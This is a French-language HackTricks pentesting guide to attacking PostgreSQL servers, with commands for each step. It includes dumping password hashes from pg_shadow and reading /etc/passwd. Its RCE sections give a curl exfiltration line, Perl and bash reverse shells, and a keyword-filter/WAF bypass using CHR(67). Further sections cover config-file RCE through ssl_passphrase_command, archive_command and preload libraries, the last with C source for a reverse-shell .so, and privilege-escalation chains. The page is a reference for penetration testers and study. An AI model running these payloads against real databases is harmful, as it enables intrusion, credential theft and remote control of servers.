# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Informations de base**

**PostgreSQL** est décrit comme un **système de base de données objet-relationnelle** qui est **open source**. Ce système n'utilise pas seulement le langage SQL mais l'enrichit également avec des fonctionnalités supplémentaires. Ses capacités lui permettent de gérer un large éventail de types de données et d'opérations, ce qui en fait un choix polyvalent pour les développeurs et les organisations.

**Port par défaut :** 5432, et si ce port est déjà utilisé, il semble que postgresql utilisera le port suivant (probablement 5433) qui n'est pas utilisé.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Connexion & Basic Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Si en exécutant **`\list`** vous trouvez une base de données appelée **`rdsadmin`**, vous savez que vous êtes dans une base de données **AWS postgresql**.

Pour plus d'informations sur **comment abuser d'une base de données PostgreSQL**, consultez :


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Énumération automatique
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Selon [**this research**](https://www.exploit-db.com/papers/13084), lorsqu'une tentative de connexion échoue, `dblink` lance une exception `sqlclient_unable_to_establish_sqlconnection` contenant une explication de l'erreur. Des exemples de ces détails sont listés ci-dessous.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Hôte injoignable

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port fermé
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Le port est ouvert
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ou
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port ouvert ou filtré
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Dans les fonctions PL/pgSQL, il n'est actuellement pas possible d'obtenir les détails d'une exception. Cependant, si vous avez un accès direct au serveur PostgreSQL, vous pouvez récupérer les informations nécessaires. Si l'extraction des noms d'utilisateur et des mots de passe depuis les tables système n'est pas réalisable, vous pouvez envisager d'utiliser la méthode de wordlist attack discutée dans la section précédente, car elle pourrait donner des résultats positifs.

## Énumération des privilèges

### Rôles

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Le rôle a des privilèges de superutilisateur                                                                                                        |
| rolinherit     | Le rôle hérite automatiquement des privilèges des rôles dont il est membre                                                                            |
| rolcreaterole  | Le rôle peut créer d'autres rôles                                                                                                                    |
| rolcreatedb    | Le rôle peut créer des bases de données                                                                                                              |
| rolcanlogin    | Le rôle peut se connecter. Autrement dit, ce rôle peut être utilisé comme identifiant d'autorisation de session initiale                              |
| rolreplication | Le rôle est un rôle de réplication. Un rôle de réplication peut initier des connexions de réplication et créer et supprimer des replication slots.     |
| rolconnlimit   | Pour les rôles pouvant se connecter, définit le nombre maximal de connexions simultanées que ce rôle peut établir. -1 signifie pas de limite.         |
| rolpassword    | Pas le mot de passe (s'affiche toujours comme `********`)                                                                                             |
| rolvaliduntil  | Date d'expiration du mot de passe (utilisée uniquement pour l'authentification par mot de passe) ; null si pas d'expiration                          |
| rolbypassrls   | Le rôle contourne toute politique de sécurité au niveau des lignes, voir [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) pour plus d'informations. |
| rolconfig      | Valeurs par défaut spécifiques au rôle pour les variables de configuration à l'exécution                                                              |
| oid            | Identifiant du rôle                                                                                                                                  |

#### Groupes intéressants

- Si vous êtes membre de **`pg_execute_server_program`** vous pouvez **exécuter** des programmes
- Si vous êtes membre de **`pg_read_server_files`** vous pouvez **lire** des fichiers
- Si vous êtes membre de **`pg_write_server_files`** vous pouvez **écrire** des fichiers

> [!TIP]
> Notez que dans Postgres un **user**, un **group** et un **role** sont **les mêmes**. Cela dépend juste de **comment vous l'utilisez** et si vous **autorisez sa connexion**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tables
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonctions
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Actions sur le système de fichiers

### Lire les répertoires et les fichiers

From this [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) les membres du groupe défini **`DEFAULT_ROLE_READ_SERVER_FILES`** (appelé **`pg_read_server_files`**) et les **super users** peuvent utiliser la méthode **`COPY`** sur n'importe quel chemin (consultez `convert_and_check_filename` dans `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> N'oubliez pas que si vous n'êtes pas super user mais que vous avez la permission **CREATEROLE** vous pouvez **vous rendre membre de ce groupe :**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Il existe **d'autres fonctions postgres** qui peuvent être utilisées pour **lire un fichier ou lister un répertoire**. Seuls les **superusers** et les **users avec des permissions explicites** peuvent les utiliser :
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Vous pouvez trouver **plus de fonctions** sur [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Écriture simple de fichiers

Seuls les **super users** et les membres de **`pg_write_server_files`** peuvent utiliser copy pour écrire des fichiers.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> N'oubliez pas que si vous n'êtes pas super user mais que vous avez la permission **`CREATEROLE`**, vous pouvez **vous rendre membre de ce groupe :**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Plus d'informations.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Rappelez-vous que COPY ne peut pas gérer les caractères de nouvelle ligne ; par conséquent, même si vous utilisez un payload base64, **vous devez envoyer une ligne unique**.\
Une limitation très importante de cette technique est que **`copy` ne peut pas être utilisé pour écrire des fichiers binaires car il modifie certaines valeurs binaires.**

### **Téléversement de fichiers binaires**

Cependant, il existe **d'autres techniques pour téléverser de gros fichiers binaires :**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Mise à jour des données d'une table PostgreSQL via écriture d'un fichier local

Si vous disposez des permissions nécessaires pour lire et écrire les fichiers du serveur PostgreSQL, vous pouvez mettre à jour n'importe quelle table du serveur en **écrasant le filenode associé** dans [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **Plus d'information sur cette technique** [**ici**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Étapes requises :

1.  Obtenir le répertoire de données PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Note :** Si vous n'êtes pas en mesure de récupérer le chemin actuel du répertoire de données depuis settings, vous pouvez interroger la version majeure de PostgreSQL via la requête `SELECT version()` et essayer de brute-forcer le chemin. Les chemins de répertoire de données courants pour les installations Unix de PostgreSQL sont `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Un nom de cluster fréquent est `main`.

2.  Obtenir un chemin relatif vers le filenode associé à la table cible

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Cette requête devrait renvoyer quelque chose comme `base/3/1337`. Le chemin complet sur le disque sera `$DATA_DIRECTORY/base/3/1337`, c.-à-d. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Télécharger le filenode via les fonctions `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Obtenir le type de données associé à la table cible

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Utilisez le [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) pour [éditer le filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users) ; mettez tous les drapeaux booléens `rol*` à 1 pour obtenir les permissions complètes.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Réimporter le filenode modifié via les fonctions `lo_*` et écraser le fichier original sur le disque

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Optionnel)_ Vider le cache mémoire des tables en exécutant une requête SQL coûteuse

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Vous devriez maintenant voir les valeurs de la table mises à jour dans PostgreSQL.

Vous pouvez aussi devenir superadmin en modifiant la table `pg_authid`. **Voir** [**la section suivante**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE vers un programme**

Depuis la [version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), seuls les **super users** et les membres du groupe **`pg_execute_server_program`** peuvent utiliser copy pour RCE (exemple avec exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Exemple à exécuter :
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Rappelez-vous que si vous n'êtes pas super user mais disposez de la permission **`CREATEROLE`**, vous pouvez **vous ajouter à ce groupe :**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Plus d'infos.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ou utilisez le module `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
Plus d'informations sur cette vulnérabilité [**ici**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Bien que signalée comme CVE-2019-9193, PostgreSQL a déclaré qu'il s'agissait d'une [fonctionnalité et ne sera pas corrigée](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Bypass keyword filters/WAF to reach COPY PROGRAM

Dans des contextes SQLi avec des requêtes empilées, un WAF peut supprimer ou bloquer le mot-clé littéral `COPY`. Vous pouvez construire dynamiquement la commande et l'exécuter à l'intérieur d'un bloc PL/pgSQL DO. Par exemple, construisez le préfixe C avec `CHR(67)` pour contourner des filtres naïfs et EXECUTE la commande assemblée :
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
Ce schéma évite le filtrage statique par mots-clés tout en permettant l'exécution de commandes OS via `COPY ... PROGRAM`. Il est particulièrement utile lorsque l'application renvoie les erreurs SQL et autorise les requêtes empilées.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Une fois que vous avez **appris** dans le post précédent **comment téléverser des fichiers binaires**, vous pouvez essayer d'obtenir **RCE en téléversant une extension PostgreSQL et en la chargeant**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> Les vecteurs RCE suivants sont particulièrement utiles dans des contextes SQLi contraints, car toutes les étapes peuvent être effectuées via des instructions SELECT imbriquées

Le **fichier de configuration** de PostgreSQL est **modifiable** par l'utilisateur **postgres**, qui exécute la base de données ; en tant que **superuser**, vous pouvez écrire des fichiers dans le système de fichiers, et donc **écraser ce fichier.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

Plus d'informations [sur cette technique ici](https://pulsesecurity.co.nz/articles/postgres-sqli).

Le fichier de configuration comporte quelques attributs intéressants qui peuvent mener à une RCE :

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Chemin vers la clé privée de la base de données
- `ssl_passphrase_command = ''` Si le fichier privé est protégé par mot de passe (chiffré) postgresql **exécutera la commande indiquée dans cet attribut**.
- `ssl_passphrase_command_supports_reload = off` **Si** cet attribut est **on** la **commande** exécutée si la clé est protégée par mot de passe **sera exécutée** lorsque `pg_reload_conf()` sera **exécutée**.

L'attaquant devra alors :

1. **Extraire la clé privée** du serveur
2. **Chiffrer** la clé privée téléchargée :
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Écraser**
4. **Extraire** la **configuration** actuelle de postgresql
5. **Écraser** la **configuration** avec la configuration d'attributs mentionnée :
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Exécuter `pg_reload_conf()`

En testant cela, j'ai remarqué que cela ne fonctionne que si le fichier de clé privée a des permissions 640, qu'il est possédé par root et par le groupe ssl-cert ou postgres (pour que l'utilisateur postgres puisse le lire), et qu'il est placé dans _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**Plus d'informations sur cette config et sur le WAL ici**(https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3).

Un autre attribut du fichier de configuration exploitable est `archive_command`.

Pour que cela fonctionne, le paramètre `archive_mode` doit être `'on'` ou `'always'`. Si c'est le cas, on peut écraser la commande dans `archive_command` et la forcer à s'exécuter via les opérations WAL (write-ahead logging).

Les étapes générales sont :

1. Vérifier si archive mode est activé : `SELECT current_setting('archive_mode')`
2. Écraser `archive_command` avec le payload. Par ex., un reverse shell : `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recharger la config : `SELECT pg_reload_conf()`
4. Forcer une opération WAL afin d'exécuter la commande d'archive : `SELECT pg_switch_wal()` ou `SELECT pg_switch_xlog()` pour certaines versions de Postgres

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

Quand des écritures multi-lignes sont nécessaires (p.ex., pour définir plusieurs GUCs), utilisez les PostgreSQL Large Objects pour lire et écraser complètement la config depuis SQL. Cette approche est idéale dans des contextes SQLi où `COPY` ne peut pas gérer les nouvelles lignes ou des écritures sûres pour le binaire.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Cela permet une exécution fiable de commandes OS via `archive_command` en tant qu'utilisateur `postgres`, à condition que `archive_mode` soit activé. En pratique, définir un `archive_timeout` faible peut provoquer des invocations rapides sans nécessiter un basculement explicite de WAL.

#### **RCE avec preload libraries**

Plus d'informations [sur cette technique ici](https://adeadfed.com/posts/postgresql-select-only-rce/).

Ce vecteur d'attaque exploite les variables de configuration suivantes :

- `session_preload_libraries` -- libraries that will be loaded by the PostgreSQL server at the client connection.
- `dynamic_library_path` -- list of directories where the PostgreSQL server will search for the libraries.

On peut définir la valeur de `dynamic_library_path` sur un répertoire inscriptible par l'utilisateur `postgres` exécutant la base de données, par exemple le répertoire `/tmp/`, et y téléverser un objet `.so` malveillant. Ensuite, on forcera le serveur PostgreSQL à charger notre bibliothèque nouvellement téléversée en l'incluant dans la variable `session_preload_libraries`.

Les étapes de l'attaque sont :

1. Télécharger le `postgresql.conf` original
2. Inclure le répertoire `/tmp/` dans la valeur de `dynamic_library_path`, par ex. `dynamic_library_path = '/tmp:$libdir'`
3. Inclure le nom de la bibliothèque malveillante dans la valeur de `session_preload_libraries`, par ex. `session_preload_libraries = 'payload.so'`
4. Vérifier la version majeure de PostgreSQL via la requête `SELECT version()`
5. Compiler le code de la bibliothèque malveillante avec le package de développement PostgreSQL adéquat Exemple de code :

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Téléverser le `postgresql.conf` malveillant créé aux étapes 2-3 et écraser l'original
7. Téléverser le `payload.so` de l'étape 5 dans le répertoire `/tmp`
8. Recharger la configuration du serveur en redémarrant le serveur ou en appelant la requête `SELECT pg_reload_conf()`
9. À la prochaine connexion à la DB, vous recevrez la connexion reverse shell.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Selon la [**docs**](https://www.postgresql.org/docs/13/sql-grant.html) : _Les rôles ayant le privilège **`CREATEROLE`** peuvent **accorder ou révoquer l'appartenance à n'importe quel rôle** qui **n'est pas** un **superuser**._

Donc, si vous avez le privilège **`CREATEROLE`**, vous pourriez vous accorder l'accès à d'autres **rôles** (qui ne sont pas superuser) qui peuvent vous permettre de lire et écrire des fichiers et d'exécuter des commandes :
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modifier le mot de passe

Les utilisateurs ayant ce rôle peuvent également **modifier** les **mots de passe** des autres **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Il est assez courant de constater que **les utilisateurs locaux peuvent se connecter à PostgreSQL sans fournir de mot de passe**. Par conséquent, une fois que vous avez obtenu **les permissions d'exécuter du code** vous pouvez abuser de ces permissions pour vous accorder le rôle **`SUPERUSER`** :
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Cela est généralement possible à cause des lignes suivantes dans le fichier **`pg_hba.conf`** :
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

Dans [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) est expliqué comment il a été possible de **privesc** dans Postgres GCP en abusant du privilège ALTER TABLE qui avait été accordé à l'utilisateur.

Lorsque vous essayez de **rendre un autre utilisateur propriétaire d'une table** vous devriez obtenir une **erreur** vous en empêchant, mais apparemment GCP a donné cette **option à l'utilisateur postgres qui n'est pas superuser** sur GCP :

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

En reliant cette idée au fait que lorsque les commandes **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) sont exécutées sur une **table avec une fonction d'index**, la **fonction** est **appelée** dans le cadre de la commande avec les **permissions du propriétaire de la table**. Il est possible de créer un index avec une fonction et d'accorder les permissions de propriétaire à un **super user** sur cette table, puis d'exécuter ANALYZE sur la table avec la fonction malveillante qui pourra exécuter des commandes parce qu'elle utilise les privilèges du propriétaire.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Commencez par créer une nouvelle table.
2. Insérez du contenu sans importance dans la table pour fournir des données à la fonction d'index.
3. Développez une fonction d'index malveillante qui contient un payload d'exécution de code, permettant l'exécution de commandes non autorisées.
4. Exécutez ALTER pour changer le propriétaire de la table en "cloudsqladmin", qui est le rôle superutilisateur de GCP utilisé exclusivement par Cloud SQL pour gérer et maintenir la base de données.
5. Effectuez une opération ANALYZE sur la table. Cette action force le moteur PostgreSQL à passer au contexte utilisateur du propriétaire de la table, "cloudsqladmin". Par conséquent, la fonction d'index malveillante est appelée avec les permissions de "cloudsqladmin", permettant ainsi l'exécution de la commande shell précédemment non autorisée.

Dans PostgreSQL, ce flux ressemble à ceci:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Ensuite, la table `shell_commands_results` contiendra la sortie du code exécuté :
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Connexion locale

Certaines instances postgresql mal configurées peuvent permettre la connexion de n'importe quel utilisateur local ; il est possible de se connecter localement depuis 127.0.0.1 en utilisant la fonction **`dblink`** :
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Notez que pour que la requête précédente fonctionne **la fonction `dblink` doit exister**. Si elle n'existe pas, vous pouvez essayer de la créer avec
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Si vous avez le mot de passe d'un utilisateur disposant de privilèges supérieurs, mais que l'utilisateur n'est pas autorisé à se connecter depuis une IP externe, vous pouvez utiliser la fonction suivante pour exécuter des requêtes en tant que cet utilisateur :
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Il est possible de vérifier si cette fonction existe avec :
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Fonction personnalisée avec** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters ont pu privesc à l'intérieur d'une instance postgres fournie par IBM, parce qu'ils **ont trouvé cette fonction avec le flag SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Comme [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) une fonction avec **SECURITY DEFINER** est exécutée avec les privilèges de l'**utilisateur qui en est propriétaire**. Par conséquent, si la fonction est **vulnérable à SQL Injection** ou effectue des **actions privilégiées avec des params contrôlés par l'attaquant**, elle peut être exploitée pour **escalader les privilèges dans postgres**.

À la ligne 4 du code précédent, vous pouvez voir que la fonction a le **flag SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **execute commands**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

